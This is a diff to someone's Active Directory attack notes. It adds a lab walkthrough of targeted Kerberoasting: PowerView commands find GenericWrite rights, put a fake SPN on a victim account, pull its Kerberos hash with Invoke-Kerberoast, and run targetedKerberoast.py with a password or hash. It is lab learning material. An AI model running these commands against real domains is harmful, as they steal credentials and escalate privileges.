@@ -9,6 +9,7 @@ This is my personal notes on learning Active Directory. Do check out this repo t
 * **[Unconstrained-Delegation](#unconstrained-delegation)**
 * **[Constrained-Delegation](#constrained-delegation)**
 * **[Resource-Based Constrained Delegation](#resource-based-constrained-delegation)**
+* **[Targeted  Kerberoast](#targeted-kerberoast)**
 
 ## Weak GPO Permissions
 
@@ -437,7 +438,7 @@ https://github.com/leechristensen/SpoolSample.git
 sekurlsa::tickets /export
 ```
 
-![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210811232703.png)
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Paste d%20image%2020210811232703.png)
 
 - We can see that there is DC **(kirbi file)**
 
@@ -977,4 +978,118 @@ Get-DomainComputer DC01  | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofo
 2. https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
 3. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
 4. https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/
+```
+
+## Targeted Kerberoast
+
+### Setup
+
+1. Create two users (VictimTK) and (AttackerTK). Go to Server Manager -> Tools -> Active Directory Users and Computers. Right click on Users and click New -> User. Fill in all the details.
+
+![[Pasted image 20210817214807.png]]
+
+![[Pasted image 20210817214846.png]]
+
+![[Pasted image 20210817214910.png]]
+
+2. Right Click on VitmTK and click on Properties. Go to Security Tab  (If you cannot see it just go to View -> Advanced Features).
+
+![[Pasted image 20210817215211.png]]
+
+3. Click on Advanced -> Add -> Select a Principal and choose AttackerTK user.  Clear all permissions. Then we can do 2 different things whether to make this user have **Generic Write** or **Generic All**
+
+- Generic Write. Please tick on these permissions. **(Write all properties, Read permissions, All validated writes)**
+
+![[Pasted image 20210816214601.png]]
+
+-  Generic All . Just click on **Full Control**.
+
+![[Pasted image 20210816214451.png]]
+
+4. In this case, I will use the **Generic Write**
+
+### Detect
+
+1. Use Powerview.ps1
+
+```bash
+1. Check any users with GenericWrite
+Get-ObjectAcl -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -like "*GenericWrite*" -and $_.Obje
+ctDN -match "Users" }
+Find-InterestingDomainAcl -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -like "*GenericWrite*" -and $_.ObjectDN -match "Users" }
+
+2. Convert from SID
+ConvertFrom-SID S-1-5-21-1107409599-3969185633-1580028286-1115
+```
+
+![[Pasted image 20210817222909.png]]
+
+![[Pasted image 20210817223227.png]]
+
+![[Pasted image 20210817222923.png]]
+
+### Attack
+
+1. With only Plaintext Password of AttackerTK without it shell.
+
+```bash
+1. Create a PSCredential Object
+$username = 'bank.local\AttackerTK' 
+$password = convertto-securestring -Force -AsPlainText "Passw0rd@123!" 
+$cred = New-Object System.Management.Automation.PSCredential($username,$password)
+
+2. Checker (Before)
+Invoke-Kerberoast
+
+3. Set DomainObject on the VictimTK Account.
+Set-DomainObject -Identity VictimTK -Set @{serviceprincipalname='B
+ANK/myspn'} -Credential $cred
+
+4. Checker (After)
+Invoke-Kerberoast
+
+5. Clean
+Set-DomainObject -Identity VictimTK -Clear serviceprincipalname
+```
+
+![[Pasted image 20210817224108.png]]
+
+2. Having a shell of AttackerTK.
+
+```bash
+1. Checker (Before)
+Invoke-Kerberoast
+
+2. Set DomainObject on the VictimTK Account.
+Set-DomainObject -Identity VictimTK -Set @{serviceprincipalname='B
+ANK/myspn'} -Credential
+
+3. Checker (After)
+Invoke-Kerberoast
+```
+
+![[Pasted image 20210817224108.png]]
+
+3. targetedKerberoast.py
+
+```bash
+=> Download
+https://github.com/ShutdownRepo/targetedKerberoast.git
+
+=> Commands
+python3 targetedKerberoast.py -d bank.local -u AttackerTK -p 'Passw0rd@123!' --dc-ip 192.168.125.136
+python3 targetedKerberoast.py -d bank.local -u AttackerTK -H ':577BA934CE4EC1598BF4851AA85E465F' --dc-ip 192.168.125.136
+```
+
+![[Pasted image 20210817230754.png]]
+
+![[Pasted image 20210817230945.png]]
+
+
+### References
+
+```bash
+1. https://github.com/aniqfakhrul/archives#targeted-kerberoast
+2. https://github.com/ShutdownRepo/targetedKerberoast
+3. https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/
 ```
